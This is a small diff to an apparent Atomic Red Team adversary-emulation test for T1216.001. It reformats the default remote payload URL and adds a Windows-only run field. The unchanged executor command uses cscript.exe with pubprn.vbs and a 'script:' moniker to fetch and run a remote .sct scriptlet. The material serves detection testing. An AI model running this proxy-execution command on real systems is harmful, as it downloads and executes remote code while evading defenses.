@@ -11,8 +11,11 @@ atomic_tests:
     remote_payload:
       description: A remote payload to execute using PubPrn.vbs.
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct
+      default: 
+        https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct
   executor:
     command: |
       cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:#{remote_payload}"
     name: command_prompt
+  run_on:
+  - windows
